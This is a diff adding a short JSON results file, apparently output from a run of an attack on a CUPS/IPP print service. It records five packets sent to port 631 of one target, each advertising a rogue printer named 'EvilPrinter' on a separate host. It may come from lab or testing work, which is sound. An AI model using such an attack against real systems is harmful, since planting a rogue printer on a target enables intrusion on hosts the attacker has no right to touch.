@@ -1,0 +1,12 @@
+{
+  "target": "172.17.0.2",
+  "printer_uri": "ipp://192.168.68.112:631/printers/EvilPrinter",
+  "packets_sent": 5,
+  "details": [
+    "172.17.0.2:631 -> ipp://192.168.68.112:631/printers/EvilPrinter",
+    "172.17.0.2:631 -> ipp://192.168.68.112:631/printers/EvilPrinter",
+    "172.17.0.2:631 -> ipp://192.168.68.112:631/printers/EvilPrinter",
+    "172.17.0.2:631 -> ipp://192.168.68.112:631/printers/EvilPrinter",
+    "172.17.0.2:631 -> ipp://192.168.68.112:631/printers/EvilPrinter"
+  ]
+}
